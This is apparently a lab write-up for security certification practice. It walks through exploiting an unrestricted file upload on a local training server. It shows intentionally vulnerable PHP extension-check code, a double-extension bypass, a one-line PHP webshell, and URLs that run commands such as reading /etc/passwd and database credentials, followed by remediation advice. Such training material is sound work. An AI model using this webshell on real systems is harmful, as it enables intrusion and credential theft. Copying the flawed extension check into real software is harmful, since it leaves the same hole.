# 10 — Unrestricted File Upload

GingerByte lab · CSTM preparation  
Covers: file upload recon · direct PHP upload · double extension bypass · webshell RCE

---

## Exercise 1 — Confirm Upload Functionality and Storage Location

### What to check

Before attempting any bypass, confirm:
- The server accepts files
- Uploaded files land in a web-accessible directory
- The server serves those files back (meaning a PHP file there would execute)

### Steps

1. Browse to `http://localhost:8080/admin/upload.php`
2. Upload any legitimate image (`.jpg` or `.png`)
3. Click the link in the success message — the image loads in the browser
4. This confirms:
   - Uploads are stored in `/uploads/` — a publicly accessible path
   - Files are served directly, not through a download handler
   - A PHP file placed here would be executed by the server, not served as text

### Why this matters

If uploaded files were stored outside the web root, or served through a handler that set `Content-Type: application/octet-stream`, a webshell would download rather than execute. Confirming web-accessible storage is the critical prerequisite for any file upload attack.

---

## Exercise 2 — Attempt Direct PHP Upload (Blocked)

### Steps

1. Create a proof-of-concept PHP file on Kali:
   ```bash
   echo '<?php echo "PHP executed successfully!"; ?>' > /tmp/poc.php
   ```
2. Browse to `http://localhost:8080/admin/upload.php`
3. Choose `poc.php` and upload
4. Result: *"Invalid file type. Only JPG, PNG and GIF images are allowed."*
5. Browse to `http://localhost:8080/uploads/poc.php` — file does not exist

The server is filtering by extension. Direct `.php` uploads are blocked.

---

## Exercise 3 — Bypass the Extension Filter with Double Extension

### Vulnerable code

**`/var/www/html/admin/upload.php`**

```php
// ---- VULNERABILITY: splits on FIRST dot, not last ----
$parts = explode(".", $filename);
$ext = strtolower($parts[1] ?? "");   // shell.jpg.php → "jpg" ✓ passes

$allowed = ["jpg", "jpeg", "png", "gif"];
if (in_array($ext, $allowed)) {
    move_uploaded_file($file["tmp_name"], $uploadDir . $filename);
}
```

`explode(".", "shell.jpg.php")` returns `["shell", "jpg", "php"]`. The check reads index `[1]` — which is `jpg` — and passes. The filename is preserved on disk as `shell.jpg.php`, and Apache executes it as PHP because `.php` is the final extension.

### Steps

1. Rename the PoC file to use a double extension:
   ```bash
   cp /tmp/poc.php /tmp/poc.jpg.php
   ```
2. Upload `poc.jpg.php` via `http://localhost:8080/admin/upload.php`
3. Result: *"Image uploaded: poc.jpg.php"* — the filter is bypassed
4. Browse to `http://localhost:8080/uploads/poc.jpg.php`
5. Result: `PHP executed successfully!` — PHP code executed on the server

The extension filter is defeated. The server only inspects the first extension; the final `.php` extension causes Apache to execute the file.

---

## Exercise 4 — Upload a Webshell and Execute System Commands

### Steps

1. Create a webshell with a double extension:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.jpg.php
   ```

2. Upload `shell.jpg.php` via `http://localhost:8080/admin/upload.php`

3. Execute commands by browsing to the shell with a `cmd` parameter:

   | URL | Expected output |
   |---|---|
   | `/uploads/shell.jpg.php?cmd=pwd` | `/var/www/html/uploads` |
   | `/uploads/shell.jpg.php?cmd=whoami` | `www-data` |
   | `/uploads/shell.jpg.php?cmd=cat%20/etc/passwd` | Full `/etc/passwd` contents |
   | `/uploads/shell.jpg.php?cmd=ls%20/var/www/html` | Full web root listing |
   | `/uploads/shell.jpg.php?cmd=cat%20/var/www/html/includes/db.php` | Database credentials |

4. The server executes each command as `www-data` and returns the output in the browser

### Security impact

- **Remote Code Execution** — arbitrary OS commands run as the web server process
- **Full application compromise** — read source, dump database, modify files, plant backdoors
- **Lateral movement** — from `www-data`, attempt to pivot to other internal services
- **Persistence** — additional webshells survive page changes and server restarts

### OWASP category

A03 — Injection (code execution via uploaded PHP)  
A04 — Insecure Design (uploads stored in web-accessible directory, original filename preserved)  
A05 — Security Misconfiguration (PHP execution not disabled in uploads directory)

### Remediation

- **Use `pathinfo($filename, PATHINFO_EXTENSION)`** — this always returns the last extension, not the second:
  ```php
  $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
  // "shell.jpg.php" → "php" → rejected
  ```
- **Rename uploaded files server-side** — generate a random name with the validated extension; never preserve the original filename
- **Store uploads outside the web root** — files in `/var/uploads/` cannot be executed by browsing
- **Disable PHP execution in the uploads directory** via `.htaccess`:
  ```
  php_flag engine off
  ```
- **Validate file contents** using `finfo_file()` to check magic bytes — a PHP file masquerading as JPEG will fail
- **Set a strict Content Security Policy** and maximum file size

---

## Summary

| Exercise | Finding | Impact | OWASP |
|---|---|---|---|
| 1 — Recon | Uploads stored in web-accessible `/uploads/` directory; files served directly | High | A05 |
| 2 — Direct upload | `.php` extension blocked by filter | — | — |
| 3 — Double extension | `poc.jpg.php` bypasses filter; PHP executes on server | Critical | A03, A04 |
| 4 — Webshell | Full RCE via `shell.jpg.php?cmd=` — arbitrary OS commands as `www-data` | Critical | A03 |
